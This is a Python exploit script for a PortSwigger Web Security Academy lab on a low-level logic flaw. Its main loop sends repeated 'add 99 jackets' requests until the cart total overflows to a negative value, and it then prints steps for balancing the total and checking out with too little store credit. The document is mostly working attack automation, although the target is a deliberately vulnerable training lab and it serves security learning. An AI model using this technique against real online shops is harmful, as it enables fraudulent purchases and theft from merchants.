# Lab 05 — Low-level logic flaw
# PortSwigger: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level
#
# Vulnerability: Integer overflow — repeatedly adding items causes the
#                internal running total to exceed its numeric storage
#                limit and wrap around to a large NEGATIVE value
# Aim:           Buy the "Lightweight l33t leather jacket" using store
#                credit gained from an overflowed negative price
#
# Technique:
#   Adding 100 jackets in one request is blocked; 99 succeeds. Repeat the
#   "add 99 jackets" request many times (single-threaded, in order) until
#   the running cart total overflows past its max representable value and
#   wraps to negative. Then add a smaller item to bring the total back to
#   a small POSITIVE number within your existing store credit.
#
#   ⚠  This requires MANY requests and some iterative arithmetic — the
#      exact number of repetitions needed depends on the lab's specific
#      overflow boundary and cannot be perfectly predicted in advance.
#      This script automates the repetition and prints the running total
#      after each batch so you can decide when to stop.
#
# Usage: python business_logic_lab05.py <url> [max_repetitions]

import sys
import urllib3
from proxies import proxies
from business_logic_utils import (banner, section, make_session, login,
                                   find_product_id, add_to_cart, get_cart_total,
                                   check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BATCH_QUANTITY = 99          # confirmed working single-request quantity
CHECK_EVERY_N_REQUESTS = 10  # print running total every N repetitions

if __name__ == "__main__":
    banner()
    section("LAB 05 — LOW-LEVEL LOGIC FLAW (INTEGER OVERFLOW)")

    if len(sys.argv) < 2:
        print("  Usage: python business_logic_lab05.py <url> [max_repetitions]")
        sys.exit(1)

    url = sys.argv[1]
    max_repetitions = int(sys.argv[2]) if len(sys.argv) > 2 else 200

    session = make_session(proxies)
    if not login(session, url):
        sys.exit(1)

    print("\n  ── Step 1: confirm 99 succeeds, 100 fails\n")
    product_id = find_product_id(session, url)

    r99 = add_to_cart(session, url, product_id, quantity=99)
    check_status(r99, [200, 302], "Add quantity=99")

    r100_test_id = find_product_id(session, url)  # reuse same product for a probe
    r100 = add_to_cart(session, url, r100_test_id, quantity=100)
    print(f"  ℹ  quantity=100 status: {r100.status_code} "
          f"({'blocked as expected' if r100.status_code not in (200, 302) else 'unexpectedly allowed'})")

    print(f"\n  ── Step 2: repeat 'add {BATCH_QUANTITY}' up to {max_repetitions} times\n")
    print("  ℹ  Watching the running cart total for a NEGATIVE wraparound...\n")

    went_negative = False
    for i in range(1, max_repetitions + 1):
        add_to_cart(session, url, product_id, quantity=BATCH_QUANTITY)

        if i % CHECK_EVERY_N_REQUESTS == 0:
            total = get_cart_total(session, url)
            is_negative = total and total.strip().startswith("-")
            marker = "⚠ NEGATIVE" if is_negative else ""
            print(f"  ·  after {i} requests ({i * BATCH_QUANTITY} jackets): ${total} {marker}")

            if is_negative and not went_negative:
                went_negative = True
                print(f"\n  ✔  Overflow detected! Total went negative at ~{i} requests.")
                print(f"     Stopping repetition — proceed to Step 3 to fine-tune.\n")
                break

    if not went_negative:
        print(f"\n  ✘  Total never went negative within {max_repetitions} repetitions.")
        print(f"     Try increasing max_repetitions:")
        print(f"     python business_logic_lab05.py {url} {max_repetitions * 2}")
        sys.exit(0)

    final_total = get_cart_total(session, url)
    print_box("Current (overflowed, negative) cart total", f"${final_total}")

    print("  ── Step 3: manual fine-tuning required ──────────────────────────")
    print()
    print("  ➜  The total is now negative. To finish the exploit:")
    print("     1. Note the current negative total shown above")
    print("     2. Calculate how many units of a CHEAP item are needed to")
    print("        bring the total to a small POSITIVE number within your")
    print("        store credit (commonly ~$100)")
    print("     3. Add that many units:")
    print(f"        add_to_cart(session, '{url}', <cheap_product_id>, quantity=<N>)")
    print("     4. Check the total again with get_cart_total()")
    print("     5. Once positive and affordable, POST /cart/checkout")
    print()
    print("  ℹ  Overflow arithmetic is lab-instance-specific — exact request")
    print("     counts vary. This script gets you to the overflow point;")
    print("     the final balancing step is best fine-tuned interactively.")
